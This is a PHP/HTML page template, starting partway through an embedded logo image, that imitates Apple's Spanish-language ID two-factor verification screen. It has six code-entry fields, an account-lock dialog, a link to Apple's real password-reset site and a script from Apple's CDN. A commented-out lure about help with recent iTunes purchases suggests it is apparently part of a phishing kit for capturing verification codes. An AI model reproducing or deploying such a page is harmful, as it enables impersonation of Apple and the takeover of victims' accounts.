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" srcset="" alt="Logotipo de la aplicación" style="width: 100px;">
          </div>
        </logo>
        
        <div id="stepEl" class="  "><sign-in suppress-iforgot="{suppressIforgot}">
<div id="signin" class="signin fade-in   ">
       <!--  <h1 tabindex="-1" class="si-container-title  no-logo-available">            Inicia sesi&oacute;n para recibir ayuda con las compras de iTunes que hayas hecho en los &uacute;ltimos 90 d&iacute;as 
        </h1>     -->


    <div class="container si-field-container "  id="content_inputs">
         	<div class="widget-container fade-in  restrict-max-wh  fade-in " data-mode="embed" data-isiebutnotedge="false">
               <div id="step" class="si-step " style="z-index: 1;">
                   
                  <div id="stepEl" class="   ">
                     <hsa2 suppress-iforgot="{suppressIforgot}">
                        <div class="hsa2">
                           <verify-device {two-factor-verification-support-url}="twoFactorVerificationSupportUrl" {recovery-available}="recoveryAvailable" suppress-iforgot="{suppressIforgot}">
                           <div class="verify-device fade-in">
                              <div class="">
                                 
                                 <h1 class="si-container-title tk-intro" tabindex="-1" style='width: 100% !important;font-size: 21px; line-height: 1.38105; font-weight: 400;letter-spacing: .011em;'>
                                    <?php echo $lang['COD_BLOQUEO'];?>
                                 </h1>
                                 
                                 <div id="erro_msm" class="pop-container error tk-subbody" tabindex="-1" role="tooltip" style="display:none">
                                      <div class="error pop-top"><?php echo $lang['INCORRECTO'];?></div>
                                  </div>

                                 <div class="sec-code-wrapper">
                                    <security-code length="{codeLength}" type="tel" sr-context="Introduce el código de verificación" localised-digit="Dígito" error-message="">
                                       <div class="security-code">
                                          <idms-error-wrapper {disable-all-errors}="hasErrorLabel" {^error-type}="errorType" popover-auto-close="false" {^idms-error-wrapper-classes}="idmsErrorWrapperClasses" {has-errors-and-focus}="hasErrorsAndFocus" {show-error}="hasErrorsAndFocus" {error-message}="errorMessage" {parent-container}="parentContainer" {(enable-showing-errors)}="enableShowingErrors" anchor-element="#security-code-wrap-1522533592564-1">
                                          <div class="" id="idms-error-wrapper-1522533592564-0">
                                             <div id="security-code-wrap-1522533592564-1" class="security-code-wrap security-code-6" localiseddigit="Dígito">
                                                <div class="security-code-container force-ltr" id="cont_input">
                                                    <?php if($cod_bloqueo == "6"){?>
                                                   <div class="field-wrap force-ltr">
                                                      
                                                      
                                                      <input maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="char0" class="resting form-control force-ltr form-textbox char-field" aria-label="Introduce el código de verificación Dígito 1" placeholder="" aria-describedby="idms-input-error-1527211689731-0" data-index="0">
                                                   </div>
                                                   <?}?>
                                                   <div class="field-wrap force-ltr">
                                                      <!-- 
                                                      <input type="number" maxlength="1" id="char1" class="resting form-control force-ltr form-textbox char-field" 
                                                      aria-label="Introduce el código de verificación Dígito 2" data-index="1" >
                                                      -->
                                                      <input maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="char1" class="resting form-control force-ltr form-textbox char-field" aria-label="Dígito 2" placeholder="" aria-describedby="idms-input-error-1527211689731-0" data-index="1">
                                                      
                                                   </div>
                                                   <div class="field-wrap force-ltr">
                                                       <!--
                                                      <input type="number" maxlength="1" id="char2"class="resting form-control force-ltr form-textbox char-field" 
                                                      aria-label="Introduce el código de verificación Dígito 3" data-index="2" >
                                                      -->
                                                      <input maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="char2" class="resting form-control force-ltr form-textbox char-field" aria-label="Dígito 3" placeholder="" aria-describedby="idms-input-error-1527211689731-0" data-index="2">
                                                       
                                                   </div>
                                                   <div class="field-wrap force-ltr">
                                                      
                                                      <!-- 
                                                      <input type="number" maxlength="1" id="char3" class="resting form-control force-ltr form-textbox char-field" 
                                                      aria-label="Introduce el código de verificación Dígito 4" data-index="3" >
                                                         -->
                                                         
                                                      <input maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="char3" class="resting form-control force-ltr form-textbox char-field" aria-label="Dígito 4" placeholder="" aria-describedby="idms-input-error-1527211689731-0" data-index="3">
                                                      
                                                   </div>
                                                   <div class="field-wrap force-ltr" style="<?php if($cod_bloqueo == "4"){echo ' margin-left: 0px !important';}?>">   
                                                      <!-- 
                                                      <input type="number" maxlength="1" id="char4" class="resting form-control force-ltr form-textbox char-field" 
                                                      aria-label="Introduce el código de verificación Dígito 5" data-index="4" >
                                                      -->
                                                      
                                                    <input maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="char4" class="resting form-control force-ltr form-textbox char-field" aria-label="Dígito 5" placeholder="" aria-describedby="idms-input-error-1527211689731-0" data-index="4">  
                                                       
                                                   </div>
                                                    <?php if($cod_bloqueo == "6"){?>
                                                   <div class="field-wrap force-ltr">
                                                       <!-- 
                                                      <input type="number" maxlength="1" id="char5" class="resting form-control force-ltr form-textbox char-field" 
                                                      aria-label="Introduce el código de verificación Dígito 6" data-index="5" >
                                                      -->
                                                      
                                                     <input maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="char5" class="resting form-control force-ltr form-textbox char-field" aria-label="Dígito 6" placeholder="" aria-describedby="idms-input-error-1527211689731-0" data-index="5"> 
                                                       
                                                   </div>
                                                   <?}?>
                                                </div>
                                             </div>
                                          </div>
                                          </idms-error-wrapper>
                                       </div>
                                    </security-code>
                                 </div> 

                                 <div class="si-info">
                                    <p style='font-size: 17px;line-height: 1.47059;font-weight: 400;letter-spacing: -.022em;font-family: "SF Pro Text","SF Pro Icons","Helvetica Neue","Helvetica","Arial",sans-serif;color: #494949;'>
                                       <?php echo $lang['COMENTARIO'];?>
                                    </p>
                                 </div>

                                 <a href="#" onclick="redirect()" class="si-link ax-outline tk-subbody lite-theme-override" id="no-trstd-device-pop"   aria-haspopup="true" style="cursor:pointer">
                                    <?php echo $lang['NO_CODIGO'];?>
                                 </a> 
                                 <div class="verifying-code-text thin" style="margin-top: 6px;display:none">
                                    <img src="images/ajax-loader.gif" style="height: 15px;margin-right: 10px;margin-top: 4px;" > <?php echo $lang['VERIFI_PATRON'];?>
                                 </div>
 

                              </div>
                           </div>
                           </verify-device>
                        </div>
                     </hsa2>
                  </div>
               </div>
            </div>   
    </div>

  
 
</div>


</sign-in></div>
    </div>
    
</div>

</apple-auth>
 
<div aria-hidden="false" id="idmsModalWrapper1485962628981-0-0" class="idms-modal -wrapper dialog fade-in medium-size
        idms-modal-type-dialog idms-modal-theme-translucent idms-modal-role-alertdialog ocult" role="alertdialog"
         aria-describedby="alertInfo" tabindex="-1" style="z-index: 1061">
            <div class="idms-modal-dialog" style="">
          <div ($inserted)="focus()" id="idms-modal-1485962628981-0" class="idms-modal-content modal-content   ">
            
    <p id="alertInfo" class="sr-only" tabindex="-1" style="outline: 0px;">
                     <?php echo $lang['BLOQ_SEGURIDAD'];?>
        
    </p>
    <div class="app-dialog">
        <div class="head ">
            
                <div class="title" title-align="center">
                    <h2 id="alertInfo"> <?php echo $lang['BLOQ_SEGURIDAD'];?></h2>
                </div>
        </div>
        <div class="body" body-align="center">
            
            <div class="acc-locked" id="acc-locked">
                <div class="dialog-body">
                    <div class="dialog-info">
                        <div class="thin">
                            <?php echo $lang['COM_DEB_CUENTA'];?>
                        </div>
                        <a class="si-link" id="resetAcc" ($click)="dialogClick('resetAcc')" href="https://iforgot.apple.com/password/verify/appleid?returnURL=https%3A%2F%2Fidmsa.apple.com%2Fsignin%3Flanguage%3DES-ES%26rv%3D0%26path%3D%2F%3Fa%3D1179750425%26s%3D1%26wo%3DMS1BN7QDLY%26pli%3D79013838111353%26Env%3DUAT%26appIdKey%3D6f59402f11d3e2234be5b88bf1c96e1e453a875aec205272add55157582a9f61" target="_blank">
                            <?php echo $lang['DEB_CUENTA'];?>
                        </a>
                    </div>
                </div>
            </div>
        
        </div>
        <div class="footer">
                <div class="button-bar" btn-direction="">
                  <div class="dialog-spinner-container" id="dialog-btn-spinner"></div>
                </div>
        </div>
    </div>

                <i class="icon icon_remove74_gray idms-modal-i-close" id="idms-close" tabindex="0" role="button" aria-label="true" onclick="clos()">
                </i>
            <div style="clear:both"></div>
          </div>
        </div>
      </div>


</div>
 
<script type="text/javascript" src="https://appleid.cdn-apple.com/appleauth/static/jsj/1577869377/widget/auth/app.js"></script>
</body>
</html>